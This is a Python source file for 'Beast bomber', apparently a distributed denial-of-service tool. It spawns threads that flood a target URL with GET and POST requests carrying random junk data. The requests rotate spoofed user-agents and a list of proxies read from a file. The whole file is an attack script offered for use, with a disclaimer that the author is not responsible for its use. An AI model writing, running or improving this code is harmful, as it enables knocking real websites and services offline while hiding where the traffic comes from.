"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/un1cum                                                      ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                            Copyright (C) 2023 un1cum                            ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""
import time
import random
import asyncio
import aiohttp
from threading import Thread
from fake_useragent import UserAgent

proxies = []
ua = UserAgent()
lib = "1234567890qwertyuiop[]asdfghjkl;'zxcvbnm,./_"

with open('input/proxies.txt', 'r') as file:
    for line in file:
        proxies.append(line.replace('\n', ''))


def start_ddos(threads, time_a, target):
    for _ in range(threads):
        th = Thread(target=ddos_attack, args=(time_a, target))
        th.start()


async def req(target, proxy):
    async with aiohttp.ClientSession() as session:
        user = ua.random
        st = ''

        for _ in range(random.randint(10, 200)):
            st += random.choice(lib)

        header = {'user-agent': user}

        try:
            await session.get(target, timeout=1, proxies=proxy)
        except:
            pass

        try:
            await session.get(target, headers=header, timeout=1, proxies=proxy)
        except:
            pass

        try:
            await session.post(target, data=st, headers=header, timeout=1, proxies=proxy)
        except:
            pass

        try:
            await session.post(target, data=st, timeout=1, proxies=proxy)
        except:
            pass

        try:
            await session.post(target, json=st, headers=header, timeout=1, proxies=proxy)
        except:
            pass

        try:
            await session.post(target, json=st, timeout=1, proxies=proxy)
        except:
            pass


def ddos_attack(time_a, target):
    t = time.monotonic()
    while time.monotonic() - t < time_a:
        for proxy in proxies:
            proxy_2 = {
                "http": "http://" + proxy,
                "https": "https://" + proxy
            }
            asyncio.run(req(target, proxy_2))
